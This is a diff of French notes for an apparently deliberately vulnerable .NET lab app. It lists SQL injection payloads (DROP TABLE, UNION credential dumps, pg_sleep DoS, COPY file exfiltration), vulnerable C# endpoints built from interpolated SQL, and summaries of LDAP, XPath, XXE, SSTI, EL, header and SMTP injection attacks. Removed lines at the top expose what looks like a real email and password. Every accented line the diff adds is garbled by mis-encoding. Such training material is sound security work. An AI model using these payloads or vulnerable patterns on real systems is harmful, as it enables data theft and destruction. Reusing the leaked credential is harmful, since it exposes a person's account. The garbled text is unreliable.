@@ -1,163 +1,160 @@
-stephane.belkheraz@stago.com
-Stago-*$PP987
-
 dotnet ef migrations add InitialCreate
 dotnet ef database update
 
 
 Injection SQL
 
-Payloads classiques d’injection SQL à tester
+Payloads classiques dâ€™injection SQL Ã  tester
 
 admin' --	
-(Ignore le reste de la requête)
+(Ignore le reste de la requÃªte)
 
 admin' OR '1'='1	
 (Retourne toutes les lignes)
 
 '; DROP TABLE Users;--	
-(Supprime la table Users (exécute un DROP))
+(Supprime la table Users (exÃ©cute un DROP))
 
 ' UNION SELECT username, password FROM users--	
 Fusionne un autre SELECT
 
 ' OR 1=1;--
-supprime les données dans le cadre d'un delete
+supprime les donnÃ©es dans le cadre d'un delete
 
 
 
 
 ' OR '1'='1	Retourne tous les produits (bypass filtre)
 %'; DROP TABLE products;--	Supprime la table products (attaque destructrice)
-%'; SELECT pg_sleep(5);--	Ralentit la requête (attaque DoS simple)
+%'; SELECT pg_sleep(5);--	Ralentit la requÃªte (attaque DoS simple)
 %'; COPY products TO '/tmp/pwned.csv' CSV;--	Exfiltration par copie fichier (si droits DB)
-%'; SELECT version();--	Récupération version PostgreSQL
+%'; SELECT version();--	RÃ©cupÃ©ration version PostgreSQL
 
 ____________________________________________
-Injection en lecture avancée (exfiltration)
+Injection en lecture avancÃ©e (exfiltration)
 
-Si l’appli affiche directement le résultat SQL, on peut utiliser une injection pour extraire des données sensibles 
-(par exemple, concaténer des colonnes ou exploiter une union) :
+Si lâ€™appli affiche directement le rÃ©sultat SQL, on peut utiliser une injection pour extraire des donnÃ©es sensibles 
+(par exemple, concatÃ©ner des colonnes ou exploiter une union) :
 
 %' UNION SELECT 1, version(), 'malicious'-- 
 
 var sql = $"SELECT id, name, description FROM products WHERE name LIKE '%{productName}%'";
 var products = _db.Products.FromSqlRaw(sql).ToList();
 
-On va injecter %' UNION SELECT 1, version(), 'x'-- pour forcer la DB à retourner la version dans la colonne name.
+On va injecter %' UNION SELECT 1, version(), 'x'-- pour forcer la DB Ã  retourner la version dans la colonne name.
 
 ____________________________________________
 Injection sur commandes de modification/suppression
 
-Exemple pour un endpoint vulnérable supprimant un produit par nom :
+Exemple pour un endpoint vulnÃ©rable supprimant un produit par nom :
 
 [HttpPost]
 public IActionResult Delete(string productName)
 {
     var sql = $"DELETE FROM products WHERE name = '{productName}'";
     int deleted = _db.Database.ExecuteSqlRaw(sql);
-    return Content($"{deleted} produit(s) supprimé(s)");
+    return Content($"{deleted} produit(s) supprimÃ©(s)");
 }
 
 Injection possible : anything'; DROP TABLE products;--
-=> Supprime la table entière !
+=> Supprime la table entiÃ¨re !
 
 ____________________________________________
-Injection avec paramètre multiple & requêtes composées
+Injection avec paramÃ¨tre multiple & requÃªtes composÃ©es
 
-PostgreSQL accepte les requêtes multiples séparées par ; dans certains cas, donc injection peut faire plusieurs actions :
+PostgreSQL accepte les requÃªtes multiples sÃ©parÃ©es par ; dans certains cas, donc injection peut faire plusieurs actions :
 
 '; DELETE FROM products WHERE id > 0; -- 
 
 
 ____________________________________________
-Contrôleur InjectionLdapController :
+ContrÃ´leur InjectionLdapController :
 
-8 types d'attaques LDAP différentes (basic, wildcard, boolean, null, attributes, blind, escape, dn)
-Simulation d'un annuaire LDAP avec des données réalistes
-Construction de filtres LDAP vulnérables
-Gestion des différents scénarios d'injection
+8 types d'attaques LDAP diffÃ©rentes (basic, wildcard, boolean, null, attributes, blind, escape, dn)
+Simulation d'un annuaire LDAP avec des donnÃ©es rÃ©alistes
+Construction de filtres LDAP vulnÃ©rables
+Gestion des diffÃ©rents scÃ©narios d'injection
 
 ____________________________________________
-Contrôleur InjectionXpathController :
+ContrÃ´leur InjectionXpathController :
 
 8 types d'attaques XPath : basic, union, position, string, count, comment, boolean, wildcard
-Document XML simulé avec des données sensibles (mots de passe, cartes de crédit, clés API)
-Exécution réelle de requêtes XPath vulnérables
-Gestion des résultats scalaires et nœuds
+Document XML simulÃ© avec des donnÃ©es sensibles (mots de passe, cartes de crÃ©dit, clÃ©s API)
+ExÃ©cution rÃ©elle de requÃªtes XPath vulnÃ©rables
+Gestion des rÃ©sultats scalaires et nÅ“uds
 ____________________________________________
-Contrôleur InjectionXxeController :
+ContrÃ´leur InjectionXxeController :
 
 8 types d'attaques XXE :
 
 file : Lecture de fichiers locaux (ex: /etc/passwd)
 ssrf : Server-Side Request Forgery
 dos : Denial of Service (Billion Laughs)
-parameter : Entités paramétrées avec DTD externes
+parameter : EntitÃ©s paramÃ©trÃ©es avec DTD externes
 blind : XXE aveugle avec exfiltration out-of-band
 internal : DTD interne
-php : Wrappers PHP spécifiques
+php : Wrappers PHP spÃ©cifiques
 oob : Out-of-Band via DNS/HTTP
 
 
 
 ____________________________________________
 
-Contrôleur InjectionTemplateController :
+ContrÃ´leur InjectionTemplateController :
 
 8 types d'attaques SSTI :
 
 basic : Expressions Razor simples (@(7*7))
 code : Blocs de code C# arbitraire
-system : Accès aux informations système
+system : AccÃ¨s aux informations systÃ¨me
 file : Lecture de fichiers locaux
-reflection : Utilisation de la réflexion .NET
-network : Requêtes réseau (SSRF)
+reflection : Utilisation de la rÃ©flexion .NET
+network : RequÃªtes rÃ©seau (SSRF)
 loop : DoS via boucles intensives
-database : Exposition de chaînes de connexion
+database : Exposition de chaÃ®nes de connexion
 
 
-Simulation sécurisée : Le code ne compile pas vraiment les templates Razor (trop dangereux), mais simule les résultats de manière réaliste
+Simulation sÃ©curisÃ©e : Le code ne compile pas vraiment les templates Razor (trop dangereux), mais simule les rÃ©sultats de maniÃ¨re rÃ©aliste
 
 ____________________________________________
 
-Contrôleur InjectionElController :
+ContrÃ´leur InjectionElController :
 
 8 types d'attaques EL :
 
 basic : Expressions EL simples (${7*7}, ${user.name})
-method : Invocation de méthodes dangereuses
-reflection : Utilisation de la réflexion Java/.NET
+method : Invocation de mÃ©thodes dangereuses
+reflection : Utilisation de la rÃ©flexion Java/.NET
 spring : Injection SpEL (Spring Expression Language)
 ognl : Injection OGNL (Struts)
-nested : Expressions imbriquées complexes
+nested : Expressions imbriquÃ©es complexes
 bypass : Techniques de contournement de filtres
 polyglot : Payloads fonctionnant sur plusieurs moteurs
 
 ____________________________________________
 
 HeaderInjectionController.cs
-Le contrôleur gère 8 types d'attaques différentes :
+Le contrÃ´leur gÃ¨re 8 types d'attaques diffÃ©rentes :
 
-redirect : Redirection malveillante via l'en-tête Location
-xss : Injection XSS via le corps de la réponse HTTP
+redirect : Redirection malveillante via l'en-tÃªte Location
+xss : Injection XSS via le corps de la rÃ©ponse HTTP
 cookie : Injection de cookies malveillants
 cache : Empoisonnement du cache
-cors : Manipulation des en-têtes CORS
-security : Désactivation des en-têtes de sécurité
+cors : Manipulation des en-tÃªtes CORS
+security : DÃ©sactivation des en-tÃªtes de sÃ©curitÃ©
 smuggling : HTTP Request Smuggling
-custom : En-têtes personnalisés
+custom : En-tÃªtes personnalisÃ©s
 
 ____________________________________________
 
 InjectionSmtpController.cs
-Le contrôleur gère 8 types d'attaques différentes :
+Le contrÃ´leur gÃ¨re 8 types d'attaques diffÃ©rentes :
 
-header : Injection d'en-têtes SMTP (Bcc, Cc, etc.)
-recipient : Ajout de destinataires non autorisés
+header : Injection d'en-tÃªtes SMTP (Bcc, Cc, etc.)
+recipient : Ajout de destinataires non autorisÃ©s
 subject : Manipulation du sujet et injection de contenu
-sender : Usurpation d'identité (spoofing From)
-attachment : Injection MIME pour pièces jointes
+sender : Usurpation d'identitÃ© (spoofing From)
+attachment : Injection MIME pour piÃ¨ces jointes
 spam : Utilisation comme relais de spam
 command : Injection de commandes SMTP directes
 xss : Injection HTML/JavaScript dans les emails
